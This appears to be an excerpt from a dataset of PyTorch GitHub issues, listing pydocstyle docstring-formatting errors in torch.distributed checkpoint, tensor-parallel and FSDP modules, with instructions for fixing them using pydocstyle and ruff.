- **Error Code**: **D200**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_backward_hook`, **Line**: 272, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_create_backward_hook`, **Line**: 272, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_record_memory_stats`, **Line**: 285, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D200**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_add_marker`, **Line**: 300, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/_tools/memory_tracker.py`, **Entity**: `_clear_state`, **Line**: 307, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/_nested_dict.py`, **Entity**: `flatten_state_dict`, **Line**: 30, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/_nested_dict.py`, **Entity**: `unflatten_state_dict`, **Line**: 55, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/_nested_dict.py`, **Entity**: `unflatten_state_dict`, **Line**: 55, **Description**: First line should end with a period (not '`')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/_sharded_tensor_utils.py`, **Entity**: `_flatten_sharded_tensors`, **Line**: 34, **Description**: First line should be in imperative mood (perhaps 'Transform', not 'Transforms')
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/_traverse.py`, **Entity**: `traverse_state_dict`, **Line**: 42, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/_traverse.py`, **Entity**: `set_element`, **Line**: 83, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/_traverse.py`, **Entity**: `get_element`, **Line**: 119, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/_traverse.py`, **Entity**: `print_tensor`, **Line**: 165, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/_traverse.py`, **Entity**: `print_tensor`, **Line**: 165, **Description**: First line should be in imperative mood; try rephrasing (found 'Callback')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/api.py`, **Entity**: `CheckpointException`, **Line**: 24, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/api.py`, **Entity**: `failures`, **Line**: 34, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/api.py`, **Entity**: `failures`, **Line**: 34, **Description**: First line should end with a period (not '
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `lookup_object`, **Line**: 141, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `lookup_object`, **Line**: 141, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `lookup_object`, **Line**: 141, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `transform_object`, **Line**: 147, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `transform_object`, **Line**: 147, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `transform_object`, **Line**: 147, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `lookup_tensor`, **Line**: 225, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `lookup_tensor`, **Line**: 225, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `lookup_tensor`, **Line**: 225, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `transform_tensor`, **Line**: 231, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `transform_tensor`, **Line**: 231, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `transform_tensor`, **Line**: 231, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `_create_default_local_metadata`, **Line**: 355, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `_check_box_overlap`, **Line**: 366, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `_check_box_overlap`, **Line**: 366, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `_check_box_overlap`, **Line**: 366, **Description**: First line should end with a period (not ')')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/default_planner.py`, **Entity**: `_check_box_overlap`, **Line**: 366, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/metadata.py`, **Entity**: `ChunkStorageMetadata`, **Line**: 21, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/metadata.py`, **Entity**: `MetadataIndex`, **Line**: 56, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/optimizer.py`, **Entity**: `_get_state_dict_2d_layout`, **Line**: 109, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/optimizer.py`, **Entity**: `load_sharded_optimizer_state_dict`, **Line**: 209, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/optimizer.py`, **Entity**: `load_sharded_optimizer_state_dict`, **Line**: 209, **Description**: First line should be in imperative mood (perhaps 'Load', not 'Loads')
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/planner.py`, **Entity**: `create_local_plan`, **Line**: 194, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/planner.py`, **Entity**: `resolve_data`, **Line**: 227, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/planner.py`, **Entity**: `resolve_data`, **Line**: 227, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/planner.py`, **Entity**: `set_up_planner`, **Line**: 311, **Description**: First line should end with a period (not '`')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/planner.py`, **Entity**: `finish_plan`, **Line**: 338, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/planner.py`, **Entity**: `commit_tensor`, **Line**: 368, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/planner_helpers.py`, **Entity**: `create_read_items_for_chunk_list`, **Line**: 146, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/resharding.py`, **Entity**: `_check_shard_metadata_pair_overlap`, **Line**: 10, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/checkpoint/resharding.py`, **Entity**: `_check_shard_metadata_pair_overlap`, **Line**: 10, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/resharding.py`, **Entity**: `_check_shard_metadata_pair_overlap`, **Line**: 10, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/resharding.py`, **Entity**: `_shards_get_overlap_region_wrt_saved_tensor`, **Line**: 30, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/storage.py`, **Entity**: `finish`, **Line**: 121, **Description**: First line should be in imperative mood (perhaps 'Write', not 'Writes')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/storage.py`, **Entity**: `read_metadata`, **Line**: 157, **Description**: First line should be in imperative mood (perhaps 'Read', not 'Reads')
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/storage.py`, **Entity**: `read_data`, **Line**: 214, **Description**: First line should be in imperative mood (perhaps 'Read', not 'Reads')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/_fsspec_filesystem.py`, **Entity**: `_StorageInfo`, **Line**: 51, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/_fsspec_filesystem.py`, **Entity**: `_StorageInfo`, **Line**: 51, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D202**, **File**: `torch/distributed/checkpoint/_fsspec_filesystem.py`, **Entity**: `__init__`, **Line**: 326, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/_fsspec_filesystem.py`, **Entity**: `__init__`, **Line**: 326, **Description**: First line should end with a period (not '`')
- **Error Code**: **D202**, **File**: `torch/distributed/checkpoint/state_dict_saver.py`, **Entity**: `save_state_dict`, **Line**: 27, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/state_dict_saver.py`, **Entity**: `save_state_dict`, **Line**: 27, **Description**: First line should be in imperative mood (perhaps 'Save', not 'Saves')
- **Error Code**: **D202**, **File**: `torch/distributed/checkpoint/state_dict_loader.py`, **Entity**: `load_state_dict`, **Line**: 25, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/state_dict_loader.py`, **Entity**: `load_state_dict`, **Line**: 25, **Description**: First line should be in imperative mood (perhaps 'Load', not 'Loads')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/filesystem.py`, **Entity**: `_StorageInfo`, **Line**: 51, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/filesystem.py`, **Entity**: `_StorageInfo`, **Line**: 51, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/filesystem.py`, **Entity**: `__init__`, **Line**: 329, **Description**: First line should end with a period (not '`')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `broadcast_object`, **Line**: 85, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `broadcast_object`, **Line**: 85, **Description**: First line should be in imperative mood; try rephrasing (found 'Same')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `gather_object`, **Line**: 98, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `gather_object`, **Line**: 98, **Description**: First line should be in imperative mood; try rephrasing (found 'Same')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `all_gather_object`, **Line**: 120, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `all_gather_object`, **Line**: 120, **Description**: First line should be in imperative mood; try rephrasing (found 'Same')
- **Error Code**: **D200**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `scatter_object`, **Line**: 136, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/checkpoint/utils.py`, **Entity**: `scatter_object`, **Line**: 136, **Description**: First line should be in imperative mood; try rephrasing (found 'Same')
- **Error Code**: **D205**, **File**: `torch/distributed/checkpoint/examples/fsdp_checkpoint_example.py`, **Entity**: ``, **Line**: 3, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/checkpoint/examples/fsdp_checkpoint_example.py`, **Entity**: ``, **Line**: 3, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/_view_with_dim_change.py`, **Entity**: `_view_with_sharding_dim_change`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D200**, **File**: `torch/distributed/tensor/parallel/_view_with_dim_change.py`, **Entity**: `_infer_dtensor_stride`, **Line**: 36, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/_view_with_dim_change.py`, **Entity**: `_infer_dtensor_stride`, **Line**: 36, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D403**, **File**: `torch/distributed/tensor/parallel/_view_with_dim_change.py`, **Entity**: `_infer_dtensor_stride`, **Line**: 36, **Description**: First word of the first line should be properly capitalized ('Infer', not 'infer')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/multihead_attention_tp.py`, **Entity**: `_stride_same_as_shard`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/multihead_attention_tp.py`, **Entity**: `TensorParallelMultiheadAttention`, **Line**: 38, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `ParallelStyle`, **Line**: 33, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `PairwiseParallel`, **Line**: 48, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `PairwiseParallel`, **Line**: 48, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `SequenceParallel`, **Line**: 69, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `SequenceParallel`, **Line**: 69, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_input_shard_1d_last_dim`, **Line**: 126, **Description**: First line should be in imperative mood; try rephrasing (found 'Wrapper')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_input_reshard_replicate`, **Line**: 151, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_input_reshard_replicate`, **Line**: 151, **Description**: First line should end with a period (not 's')
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_output_shard_1d`, **Line**: 211, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_output_replicate_1d`, **Line**: 235, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_output_tensor`, **Line**: 258, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_sharded_output_tensor`, **Line**: 284, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `make_output_reshard_tensor`, **Line**: 306, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `RowwiseParallel`, **Line**: 326, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/style.py`, **Entity**: `ColwiseParallel`, **Line**: 336, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `parallelize_module`, **Line**: 41, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `parallelize_module`, **Line**: 41, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `parallelize_module`, **Line**: 41, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `parallelize_module`, **Line**: 41, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_is_mlp_for_pairwise_parallel`, **Line**: 140, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_is_mlp_for_pairwise_parallel`, **Line**: 140, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_rowwise_parallelize_linear_fn`, **Line**: 165, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_rowwise_parallelize_linear_fn`, **Line**: 165, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_rowwise_parallelize_linear_fn`, **Line**: 165, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_rowwise_parallelize_linear_fn`, **Line**: 165, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_colwise_parallelize_linear_fn`, **Line**: 196, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_colwise_parallelize_linear_fn`, **Line**: 196, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_colwise_parallelize_linear_fn`, **Line**: 196, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_colwise_parallelize_linear_fn`, **Line**: 196, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_linear`, **Line**: 225, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_linear`, **Line**: 225, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_linear`, **Line**: 225, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_linear`, **Line**: 225, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_multihead_attn`, **Line**: 295, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_multihead_attn`, **Line**: 295, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_multihead_attn`, **Line**: 295, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_multihead_attn`, **Line**: 295, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_mlp`, **Line**: 369, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_mlp`, **Line**: 369, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/api.py`, **Entity**: `_parallelize_mlp`, **Line**: 369, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_prepare_input_validate`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_prepare_input_validate`, **Line**: 19, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_prepare_output_validate`, **Line**: 72, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_prepare_output_validate`, **Line**: 72, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_create_1d_device_mesh`, **Line**: 119, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_create_1d_device_mesh`, **Line**: 119, **Description**: First line should end with a period (not '`')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/_utils.py`, **Entity**: `_create_1d_device_mesh`, **Line**: 119, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/fsdp.py`, **Entity**: `enable_2d_with_fsdp`, **Line**: 37, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/fsdp.py`, **Entity**: `enable_2d_with_fsdp`, **Line**: 37, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/fsdp.py`, **Entity**: `enable_2d_with_fsdp`, **Line**: 37, **Description**: First line should end with a period (not ')')
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/fsdp.py`, **Entity**: `enable_2d_with_fsdp`, **Line**: 37, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `input_reshard`, **Line**: 18, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `input_reshard`, **Line**: 18, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D200**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `_pack_hook_tp`, **Line**: 62, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `_pack_hook_tp`, **Line**: 62, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `_pack_hook_tp`, **Line**: 62, **Description**: First line should be in imperative mood; try rephrasing (found 'Hook')
- **Error Code**: **D200**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `_unpack_hook_tp`, **Line**: 83, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `_unpack_hook_tp`, **Line**: 83, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/tensor/parallel/input_reshard.py`, **Entity**: `_unpack_hook_tp`, **Line**: 83, **Description**: First line should be in imperative mood; try rephrasing (found 'Hook')

cc @carljparker",False
"Fix docstring errors in fully_sharded_data_parallel.py, api.py, graph_utils.py, distribute.py, iter_graph_module.py, comm_tensor.py, experimental_ops.py, batch_dim_utils.py, data_parallel.py, graph_optimization.py module: docs triaged medium docathon-h2-2023","Please fix the following issues.
First, make sure to install the required tools:
```
pip3 install pydocstyle
```
```
pip3 install ruff
```
Then complete the followings steps:
 1. Run `pydocstyle` to see the number of errors in the file: 
 ```
pydocstyle path-to-file --count
```
 &nbsp; &nbsp; This command prints out the number of errors at the end of the output. Save this output to later add it to your PR description.
2. Next, run `ruff` which should help autofix many of these errors:
```
ruff --select RULECODE --fix path_to_file
```
&nbsp; &nbsp; `RULECODE` is the error code from the output in the issue, for example, **D200**. See the complete list of rules and autofixes [here](https://docs.astral.sh/ruff/rules/#pydocstyle-d).
3. You can run the above command with the `--unsafe-fixes` option. Double-check that the applied fixes are correct.
4. Fix the remaining issues. Fix **only** the errors listed in the issue. Skip the 'Missing docstrings' errors.
5. Run pydocstyle again:
```
pydocstyle path-to-file --count
```
This **number might not be 0** which is **OK**. Add the count of fixed errors to your PR description. 
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `FullyShardedDataParallel`, **Line**: 119, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `FullyShardedDataParallel`, **Line**: 119, **Description**: First line should end with a period (not 's')
- **Error Code**: **D200**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `module`, **Line**: 473, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D402**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `module`, **Line**: 473, **Description**: First line should not be the function's ""signature""
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `fsdp_modules`, **Line**: 512, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `fsdp_modules`, **Line**: 512, **Description**: First line should end with a period (not 'f')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `fsdp_modules`, **Line**: 512, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `apply`, **Line**: 531, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `apply`, **Line**: 531, **Description**: First line should end with a period (not ')')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `apply`, **Line**: 531, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_mixed_precision_enabled_for_buffers`, **Line**: 572, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D200**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_low_precision_hook_enabled`, **Line**: 582, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `_reset_lazy_init`, **Line**: 591, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `set_state_dict_type`, **Line**: 603, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `set_state_dict_type`, **Line**: 603, **Description**: First line should end with a period (not ')')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `get_state_dict_type`, **Line**: 705, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `get_state_dict_type`, **Line**: 705, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `state_dict_type`, **Line**: 746, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `state_dict_type`, **Line**: 746, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/fully_sharded_data_parallel.py`, **Entity**: `state_dict_type`, **Line**: 746, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
